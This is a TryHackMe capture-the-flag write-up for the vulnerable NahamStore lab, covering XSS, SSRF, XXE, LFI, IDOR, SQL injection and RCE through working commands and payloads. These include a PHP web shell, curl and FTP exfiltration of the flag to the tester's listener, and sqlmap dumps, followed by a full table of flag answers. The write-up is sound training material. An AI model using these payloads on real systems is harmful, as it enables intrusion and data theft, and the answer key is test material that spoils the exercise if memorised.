# TryHackMe — NahamStore

> Full-scope web application pentest against a deliberately vulnerable e-commerce app. Ten vulnerability classes across five subdomains and three Docker containers.

## Contents

[Setup](#setup) · [Subdomain Enumeration](#subdomain-enumeration) · [XSS](#xss) · [Open Redirect](#open-redirect) · [CSRF](#csrf) · [IDOR](#idor) · [LFI](#lfi) · [SSRF](#ssrf) · [XXE](#xxe) · [RCE](#rce) · [SQL Injection](#sql-injection) · [Answers](#answers) · [Notes](#notes)

## Setup

The app is vhost-routed. Add the apex, then substitute `.com` for `.thm` on every subdomain discovered.

```bash
echo "<target-ip> nahamstore.thm" | sudo tee -a /etc/hosts
```

Port scan first — this matters, and I skipped it initially at the cost of about an hour:

```bash
sudo nmap -sS -T4 -p- --min-rate 2000 <target-ip>
```

```
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

**Port 8000 is a second application** — the marketing admin panel, and the route to the first RCE. Nothing links to it from the main site.

---

## Subdomain Enumeration

The first sweep returned nothing, for a reason worth recording. The catch-all **echoes the requested hostname in its 404 page**, so the response size shifts with the length of whatever you fuzz:

```bash
curl -s -H "Host: nahamstore.com" http://<target-ip>/ | wc -c      # 916
curl -s -H "Host: nahamstore.thm" http://<target-ip>/ | wc -c      # 4254
curl -s -H "Host: www.nahamstore.com" http://<target-ip>/ | wc -c  # 920
```

Two findings: the app routes on `.thm`, and a fixed `-fs` filter can never work. Word count stays constant, so filter on that:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://<target-ip>/ -H "Host: FUZZ.nahamstore.thm" -fw 125 -t 50
```

| Subdomain | Response |
|---|---|
| `www` | 301 → apex |
| `shop` | 301 → apex |
| `marketing` | 200 — campaign pages |
| `stock` | 200 — JSON API |

A fifth exists that **no wordlist contains**: `nahamstore-2020-dev`. It turned up only from the room's own hint about brute force and fuzzing beyond a plain subdomain list.

```bash
sudo tee -a /etc/hosts <<'EOF'
<target-ip> www.nahamstore.thm
<target-ip> shop.nahamstore.thm
<target-ip> marketing.nahamstore.thm
<target-ip> stock.nahamstore.thm
<target-ip> nahamstore-2020-dev.nahamstore.thm
EOF
```

### Jimmy Jones' SSN

The dev subdomain exposes an unauthenticated customer API:

```bash
for i in 1 2 3; do curl -s "http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=$i"; echo; done
```

```json
{"id":1,"name":"Rita Miles","email":"rita.miles969@gmail.com","tel":"816-719-7115","ssn":"366-24-2649"}
{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}
{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","ssn":"438-92-2964"}
```

**SSN: `521-61-6392`**

### Content discovery

```bash
gobuster dir -u http://nahamstore.thm \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html -t 50 -q
```

```
/search  /login  /register  /logout  /basket  /returns  /staff  /uploads  /robots.txt
```

Four endpoints came from reading HTML and inline JS, not from any wordlist — and three of them were essential:

| Endpoint | Source | Role |
|---|---|---|
| `/stockcheck` | product page JS | SSRF |
| `/search-products?q=` | search page JS | JSON API |
| `/pdf-generator` | order page form | IDOR + RCE |
| `/product/picture/?file=` | product `img` tag | LFI |

---

## XSS

### Product page — `<title>`

```bash
curl -s "http://nahamstore.thm/product?id=1&name=soultest123" | grep -B5 'soultest123'
```

```html
<title>NahamStore - soultest123</title>
```

```
http://nahamstore.thm/product?id=1&name=</title><script>alert(1)</script>
```

**Tag: `title`**

### Search page — JavaScript variable

```bash
curl -s "http://nahamstore.thm/search?q=soultest123" | grep -A4 'soultest123'
```

```javascript
var search = 'soultest123';
$.get('/search-products?q=' + search, function(resp){ ... });
```

**Variable: `search`** — break out with `';alert(1);//`

### Returns page — `<textarea>`

```html
<textarea name="return_info" class="form-control">
```

**Tag: `textarea`**

### Hidden parameters

Don't guess names — fuzz for reflection with `-mr`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://nahamstore.thm/?FUZZ=soultest123" -mr "soultest123" -t 50 -s
```

Returns `q` and `r`. The same sweep on the product page returns `discount`, `id`, `name`.

**Shop home page: `q`** · **Other hidden parameter: `discount`**

`discount` reflects inside an attribute, so escape the attribute first:

```html
<input placeholder="Discount Code" name="discount" value="soultest123">
```

```
discount="><script>alert(1)</script>
```

### Stored XSS — HTTP header

The order detail page renders the `User-Agent` of the request that placed the order:

```
Order Date: 01/11/2026 14:55:26
User Agent: curl/8.22.0
```

**Header: `User-Agent`**

### URL-reflection XSS

The 404 page echoes the requested path unencoded:

```bash
curl -s "http://nahamstore.thm/soultest123%3Cscript%3Ealert(1)%3C/script%3E" | grep -o 'soultest123.*'
```

```html
<h1 class="text-center">Page Not Found</h1>
<p class="text-center">Sorry, we couldn't find soultest123<script>alert(1)</script> anywhere</p>
```

**H1 value: `Page Not Found`**

---

## Open Redirect

```bash
for p in url redirect next return to r dest destination continue redir out link; do
  printf "%-12s " "$p"
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "http://nahamstore.thm/?$p=https://example.com"
done
```

```
r    302    https://example.com/
```

The second one does **not** fire on a GET — it only triggers on the authenticated POST, which is why a `-mc 301,302,307` sweep across every path missed it:

```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" \
  -X POST "http://nahamstore.thm/login?redirect_url=https://example.com" \
  -d "login_email=<user>&login_password=<pass>"
```

```
302    https://example.com/
```

**One: `r`** · **Two: `redirect_url`**

---

## CSRF

Three settings forms, three different postures:

```bash
for p in email password disable; do
  echo "=== /account/settings/$p ==="
  curl -s -b cookies.txt "http://nahamstore.thm/account/settings/$p" | grep -oiE '<form[^>]*>|<input[^>]*>'
done
```

| Form | Protection |
|---|---|
| `/account/settings/email` | `csrf_protect` — base64 JSON with MD5 signature |
| `/account/settings/password` | **none** |
| `/account/settings/disable` | `csrf_disable_protect` — base64 of the bare user ID |

```bash
echo "eyJkYXRhIjoiZXlKMWMyVnlYMmxrSWpvMExDSjBhVzFsYzNSaGJYQWlPaUl4Tnprek5UUTBOVGd6SW4wPSIsInNpZ25hdHVyZSI6ImUzM2IxMTRmZDBhNmE4MjFmM2M3MGM1NzRjODY2NjA0In0=" | base64 -d
# {"data":"eyJ1c2VyX2lkIjo0...","signature":"e33b114fd0a6a821f3c70c574c866604"}

echo "NA==" | base64 -d
# 4
```

The disable form's entire protection is the user ID in base64 — no signature, trivially forgeable.

| Answer | Value |
|---|---|
| URL with no CSRF protection | `http://nahamstore.thm/account/settings/password` |
| Field to remove | `csrf_protect` |
| Encoding | `base64` |

---

## IDOR

### Address book — via checkout

The address book exposes only `delete_address_id`. The real IDOR is on checkout, where the basket renders an address by ID with no ownership check:

```html
<input type="hidden" name="address_id" value="5">
```

Checkout drains the basket, so re-add each iteration:

```bash
for i in 1 2 3 4; do
  curl -s -b cookies.txt -X POST "http://nahamstore.thm/product?id=1" -d "add_to_basket=1" -o /dev/null
  echo "=== address_id=$i ==="
  curl -s -b cookies.txt -X POST http://nahamstore.thm/basket -d "address_id=$i" \
    | grep -oiE '<strong>[^<]*</strong>|New York|[0-9]+ [A-Za-z ]+<br>' | head -6
done
```

| ID | Owner | Address |
|---|---|---|
| 1 | Mrs Rita Miles | 3914 Charles Street |
| 2 | Mr Jimmy Jones | 3999 Clay Lick Road |
| 3 | **Mr Jimmy Jones** | **160 Broadway**, New York |
| 4 | Mr Charles Cook | 4754 Swick Hill Street |

**First line: `160 Broadway`**

### Order 3 — parameter smuggling

`/pdf-generator` takes `what=order&id=N` and does check ownership:

```
Order does not belong to this user_id
```

But the `id` value is concatenated into a query string before being parsed, so an encoded `&` smuggles a second parameter that overrides the ownership check:

```bash
curl -s -b cookies.txt -X POST http://nahamstore.thm/pdf-generator \
  --data-raw "what=order&id=3%26user_id=3" -o o3.pdf && pdftotext o3.pdf - | grep -i date
```

```
Order Date: 22/02/2021 11:42:13
```

**Order 3 date/time: `22/02/2021 11:42:13`**

The `%26` is the whole trick — sent raw, so the app receives `id=3&user_id=3` as one value and re-parses it.

---

## LFI

`/product/picture/?file=` looks like a whitelist lookup — plain traversal, absolute paths, URL encoding and double encoding all return `File does not exist`. It isn't a whitelist; it's a filter that strips `../` **once**, non-recursively.

`....//` survives that: stripping the inner `../` leaves `../`. Six levels are needed:

```bash
curl -s "http://nahamstore.thm/product/picture/?file=....//....//....//....//....//....//lfi/flag.txt"
```

**Flag: `{7ef60e74b711f4c3a1fdf5a131ebf863}`**

I tested `....//` early at three levels and wrote the endpoint off. The bypass was right; the depth wasn't.

---

## SSRF

The Check Stock button posts to `/stockcheck`:

```javascript
$.post('/stockcheck', {
    product_id : $(this).attr('data-product-id'),
    server     : 'stock.nahamstore.thm'
});
```

`server` is validated by **substring**, so userinfo syntax defeats it — everything after `@` is the real host:

```bash
curl -s -X POST http://nahamstore.thm/stockcheck \
  --data-urlencode "server=stock.nahamstore.thm@127.0.0.1" -d "product_id=1"
```

### Finding the internal API

The published writeup names `internal-api.nahamstore.thm`; that **times out**. The real hostname is `.com`, and the fastest way to find it was from inside the network after getting RCE (below). PHP works where `curl` isn't installed:

```bash
U="http://marketing.nahamstore.thm/<campaign-hash>"
curl -s -G "$U" --data-urlencode "cmd=php -r 'for(\$i=1;\$i<13;\$i++){\$r=@file_get_contents(\"http://172.17.0.\$i/\",false,stream_context_create([\"http\"=>[\"timeout\"=>1]]));if(\$r)echo \"172.17.0.\$i => \".substr(\$r,0,120).\"\n\";}'"
```

```
172.17.0.2 => Marketing Manager - Active Campaigns
172.17.0.5 => {"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}
172.17.0.6 => {"server":"stock.nahamstore.thm","endpoints":[{"url":"\/product"}]}
```

Appending a path and truncating the appended `/product/{id}` with `#`:

```bash
curl -s -X POST http://nahamstore.thm/stockcheck \
  --data-urlencode "server=stock.nahamstore.thm@172.17.0.5/orders#" -d "product_id=2"
```

```json
[{"id":"4dbc51716426d49f524e10d4437a5f5a", ...},
 {"id":"5ae19241b4b55a360e677fdd9084c21c", ...},
 {"id":"70ac2193c8049fcea7101884fd4ef58e", ...}]
```

```bash
for h in 4dbc51716426d49f524e10d4437a5f5a 5ae19241b4b55a360e677fdd9084c21c 70ac2193c8049fcea7101884fd4ef58e; do
  curl -s -X POST http://nahamstore.thm/stockcheck \
    --data-urlencode "server=stock.nahamstore.thm@172.17.0.5/orders/$h#" -d "product_id=2"
  echo
done
```

```json
{"customer":{"id":2,"name":"Jimmy Jones", ...,
 "payment":{"type":"MasterCard","number":"5190216301622131","expires":"11/2023","CVV2":"223"}}}
```

**Jimmy Jones' card: `5190216301622131`**

---

## XXE

### Inbound

Not the `/staff` upload — the **stock API**, which parses an XML body when `?xml` is appended and reads `X-Token` from inside the document rather than from the header:

```bash
curl -s -X POST "http://stock.nahamstore.thm/product/1?xml" \
  -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data ANY><!ENTITY xxe SYSTEM "/flag.txt">]><data><X-Token>&xxe;</X-Token></data>'
```

```xml
<data><error>X-Token {9f18bd8b9acaada53c4c643744401ea8}
is invalid</error></data>
```

**Flag: `{9f18bd8b9acaada53c4c643744401ea8}`** — the validation error echoes the resolved entity.

### Blind (out-of-band)

This one *is* the `/staff` xlsx upload, but the DOCTYPE must go in **`xl/workbook.xml`**. Payloads in `sharedStrings.xml` or `sheet1.xml` are never parsed, which makes the endpoint look inert.

Two other gotchas: the upload rejects anything whose MIME type isn't set explicitly, and exfil must go over **FTP** — base64 of the flag contains characters that break an HTTP URL.

`xl/workbook.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [<!ENTITY % dtd SYSTEM "http://<vpn-ip>:8000/xxe.dtd"> %dtd;]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>
```

`xxe.dtd`:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://<vpn-ip>:2121/%file;'>">
%eval;
%exfil;
```

```bash
cd build && zip -q -r -X ../xxe-blind.xlsx '[Content_Types].xml' _rels xl

curl -s -b cookies.txt -X POST http://nahamstore.thm/staff \
  -F "staff_user=1" \
  -F "timesheet=@xxe-blind.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
```

The payload arrives in the FTP `CWD` command, not `USER`:

```
> CWD /e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=
```

```bash
echo 'e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=' | base64 -d
```

**Flag: `{d6b22cb3e37bef32d800105b11107d8f}`**

---

## RCE

### One — admin panel template injection

Port 8000 runs a second app, `marketingport`, with default credentials:

```bash
curl -s -c /tmp/admin.txt -X POST http://nahamstore.thm:8000/admin/login -d "username=admin&password=admin" -i | head -8
```

```
302 Found
Set-Cookie: mm_token=...
Location: /admin
```

Each campaign has an editor whose `code` textarea is the page template, rendered as PHP:

```bash
curl -s -b /tmp/admin.txt -X POST http://nahamstore.thm:8000/admin/<campaign-hash> \
  --data-urlencode "name=Hoodie Giveaway" \
  --data-urlencode 'code=<?php system($_REQUEST["cmd"]); ?>' -o /dev/null

curl -s "http://marketing.nahamstore.thm/<campaign-hash>?cmd=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
curl -s "http://marketing.nahamstore.thm/<campaign-hash>?cmd=cat%20/flag.txt"
```

**Flag: `{b42d2f1ff39874d56132537be62cf9e3}`**

### Two — blind command injection in the PDF generator

`/pdf-generator`'s `id` parameter reaches a shell. Both `$()` and backticks work. It's blind, so exfiltrate through a listener:

```bash
curl -s -b cookies.txt -X POST http://nahamstore.thm/pdf-generator \
  --data-urlencode 'what=order' \
  --data-urlencode 'id=4$(curl -s http://<vpn-ip>:8000/$(cat /flag.txt | base64 -w0))' -o /dev/null
```

```
"GET /ezkzMTI1ZTJhODQ1YTM4YzNlMTUzMWY3MmMyNTBlNjc2fQo= HTTP/1.1" 404
```

```bash
echo 'ezkzMTI1ZTJhODQ1YTM4YzNlMTUzMWY3MmMyNTBlNjc2fQo=' | base64 -d
```

**Flag: `{93125e2a845a38c3e1531f72c250e676}`**

Same parameter as the order-3 IDOR, two different bugs: one smuggles a query parameter, the other reaches a shell.

---

## SQL Injection

### One — UNION, in-band

```bash
sqlmap -u "http://nahamstore.thm/product?id=1" --batch --random-agent --level=2 --risk=2 --dbs
```

Five techniques confirmed — boolean blind, error-based (GTID_SUBSET), stacked queries, time-based blind, UNION with 5 columns. MySQL ≥ 5.6.

```bash
sqlmap -u "http://nahamstore.thm/product?id=1" --batch --random-agent \
  -D nahamstore -T sqli_one -C flag --dump
```

**Flag: `{d890234e20be48ff96a2f9caab0de55c}`**

### Two — inferential, in the returns form

The task text calls the table `sql_two`; it is actually **`sqli_two`**, which is why a targeted dump against the stated name returns nothing. The injection is in the `/returns` POST:

```bash
sqlmap -u "http://nahamstore.thm/returns" \
  --data="order_number=1&return_reason=1&return_info=x" \
  --level=5 --risk=3 --batch --threads=10 \
  -D nahamstore -T sqli_two -C flag --dump
```

**Flag: `{212ec3b036925a38b7167cf9f0243015}`**

Note the first injection point cannot reach this table — `--tables` through `/product?id=` lists only `product` and `sqli_one`. Different DB user, different grants.

---

## Answers

| Question | Answer |
|---|---|
| Jimmy Jones SSN | `521-61-6392` |
| XSS — vulnerable URL | `http://nahamstore.thm/product?id=1&name=` |
| XSS — stored via HTTP header | `User-Agent` |
| XSS — product page tag | `title` |
| XSS — JavaScript variable | `search` |
| XSS — hidden param (shop home) | `q` |
| XSS — returns page tag | `textarea` |
| XSS — H1 of URL-reflection page | `Page Not Found` |
| XSS — other hidden param | `discount` |
| Open Redirect One | `r` |
| Open Redirect Two | `redirect_url` |
| CSRF — unprotected URL | `http://nahamstore.thm/account/settings/password` |
| CSRF — field to remove | `csrf_protect` |
| CSRF — encoding | `base64` |
| IDOR — New York address | `160 Broadway` |
| IDOR — order 3 date/time | `22/02/2021 11:42:13` |
| LFI flag | `{7ef60e74b711f4c3a1fdf5a131ebf863}` |
| SSRF — Jimmy Jones' card | `5190216301622131` |
| XXE flag | `{9f18bd8b9acaada53c4c643744401ea8}` |
| Blind XXE flag | `{d6b22cb3e37bef32d800105b11107d8f}` |
| RCE flag 1 | `{b42d2f1ff39874d56132537be62cf9e3}` |
| RCE flag 2 | `{93125e2a845a38c3e1531f72c250e676}` |
| SQLi flag 1 | `{d890234e20be48ff96a2f9caab0de55c}` |
| SQLi flag 2 (blind) | `{212ec3b036925a38b7167cf9f0243015}` |

---

## Notes

**Port scan before anything else.** I spent roughly an hour hunting an "internal API" that didn't exist on port 80, while a whole second application — the admin panel that gives RCE — sat on 8000. The only port sweep I'd run went through the SSRF against `127.0.0.1`, which never saw it.

**Filter on the column that holds still.** The subdomain sweep failed against a 110k wordlist because the 404 page echoed the hostname, making response size useless as a filter. Words and lines were constant. Measure all three before choosing.

**Read the JavaScript.** `/stockcheck`, `/search-products` and `/pdf-generator` appear in inline script and a form action, and in no wordlist. Directory brute-forcing found `/staff` and `/uploads`; parsing HTML found everything that mattered.

**A filter that strips once is not a filter.** `../` was removed non-recursively, so `....//` passes straight through. I tried that bypass early at three levels, got nothing, and wrote the endpoint off — the technique was right and the depth was wrong. When a known bypass "fails", vary the depth before abandoning it.

**Substring allowlists aren't allowlists.** `server` had to contain `stock.nahamstore.thm`, and `stock.nahamstore.thm@172.17.0.5` satisfies that while pointing elsewhere entirely — the same class of bug as a prefix-matched path allowlist.

**One parameter, two bugs.** `/pdf-generator`'s `id` both smuggles a query parameter (`3%26user_id=3`, defeating an ownership check) and reaches a shell. Finding one vulnerability in a parameter is not a reason to stop testing it.

**Published writeups drift from the deployed instance.** The reference writeup named `internal-api.nahamstore.thm`; the live host is `internal-api.nahamstore.com`. Enumerating the Docker network from inside took two minutes and gave the real answer.

**`$path` is a tied array in zsh.** A loop written `for path in ...` silently destroys `PATH`, and the shell starts reporting `command not found` for `curl` and `grep` several commands later. Use any other variable name.

**Check what's installed before assuming a command failed.** Several network probes from the marketing container returned empty because `curl` and `wget` aren't present. `php -r 'file_get_contents(...)'` worked immediately and found the internal API.

---

**Platform:** TryHackMe — [S0uls](https://tryhackme.com/p/S0uls)
**Lab:** Authorized training environment only.
